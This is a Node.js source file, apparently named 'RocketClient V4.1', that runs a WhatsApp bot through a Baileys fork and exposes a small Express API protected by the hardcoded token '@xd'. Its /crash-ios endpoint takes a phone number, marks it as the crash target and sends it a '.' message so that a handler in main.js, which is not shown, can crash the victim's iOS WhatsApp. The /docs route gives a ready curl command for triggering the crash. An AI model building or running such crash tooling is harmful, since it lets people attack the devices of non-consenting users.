const {
  useMultiFileAuthState,
  DisconnectReason,
  makeWASocket,
  jidDecode
} = require("@angstvorfrauen/baileys");
const pino = require("pino");
const fs = require("fs");
const Boom = require("@hapi/boom");
const express = require("express");
const app = express();
app.use(express.json());

// === BAILEYS ===
let sock;
let sessionExists = false;

async function connectBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
  sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    logger: pino({ level: "silent" }),
  });

  sessionExists = sock.authState.creds.registered;

  // === Função personalizada no sock ===
  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      const decode = jidDecode(jid) || {};
      return decode.user && decode.server ? `${decode.user}@${decode.server}` : jid;
    }
    return jid;
  };

  sock.sendjson = async (jid, content, options = {}) => {
    const msg = await require("@angstvorfrauen/baileys").generateWAMessageFromContent(jid, content, options);
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
    return msg;
  };

  // === Eventos ===
  sock.ev.on("messages.upsert", async (chatUpdate) => {
    const m = chatUpdate.messages[0];
    if (!m.message) return;
    if (m.key.remoteJid === "status@broadcast") return;
    if (m.key.id?.startsWith("BAE5")) return;

    const msg = m.message.ephemeralMessage?.message || m.message;

    // Recarrega main.js com cache limpo
    delete require.cache[require.resolve("./main.js")];
    const handler = require("./main.js");
    await handler(sock, m, chatUpdate);
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const reason = Boom.boomify(lastDisconnect?.error)?.output.statusCode;
      sessionExists = false;
      if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
        fs.rmSync("./database/Session", { recursive: true, force: true });
      }
      setTimeout(connectBot, 3000);
    } else if (connection === "open") {
      sessionExists = true;
      console.log("Bot conectado com sucesso!");
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

connectBot();

// === APIs ===
app.get("/", (req, res) => {
  res.json({
    status: "online",
    bot: sessionExists ? "conectado" : "desconectado",
    token: "@xd",
    endpoints: {
      "/status": "GET → { connected: true }",
      "/connect?token=@xd&query=5582993708218": "Gera código",
      "/deleteSession?token=@xd": "Deleta sessão",
      "/crash-ios?token=@xd&query=5582993708218": "Envia . → crash no alvo"
    },
    docs: "/docs"
  });
});

app.get("/status", (req, res) => res.json({ connected: sessionExists }));

app.get("/connect", async (req, res) => {
  if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
  if (sessionExists) return res.status(400).json({ error: "Sessão já existe" });
  const num = req.query.query?.replace(/[^0-9]/g, "");
  if (!num) return res.status(400).json({ error: "Número inválido" });
  try {
    let code = await sock.requestPairingCode(num);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    res.json({ success: true, code });
  } catch (err) {
    res.status(500).json({ error: "Erro ao gerar código", details: err.message });
  }
});

app.get("/deleteSession", (req, res) => {
  if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
  fs.rmSync("./database/Session", { recursive: true, force: true });
  sessionExists = false;
  connectBot();
  res.json({ success: "Sessão deletada" });
});

// === CRASH IOS via API ===
app.get("/crash-ios", async (req, res) => {
  if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
  if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });

  const num = req.query.query?.replace(/[^0-9]/g, "");
  if (!num) return res.status(400).json({ error: "Número inválido" });

  const target = num + "@s.whatsapp.net";

  try {
    // Marca o alvo como "alvo do crash"
    global.crashTarget = target;

    // Envia um ponto (.) para o alvo
    await sock.sendMessage(target, { text: "." });

    res.json({ success: true, target, message: "Ponto enviado. Crash será disparado ao detectar envio." });
  } catch (err) {
    res.status(500).json({ error: "Falha ao enviar ponto", details: err.message });
  }
});

app.get("/docs", (req, res) => {
  res.json({
    api: "RocketClient V4.1",
    token: "@xd",
    examples: {
      crash: "curl 'https://seu-app.onrender.com/crash-ios?token=@xd&query=5582993708218'"
    }
  });
});

// === SERVIDOR ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`API rodando na porta ${PORT}`);
});
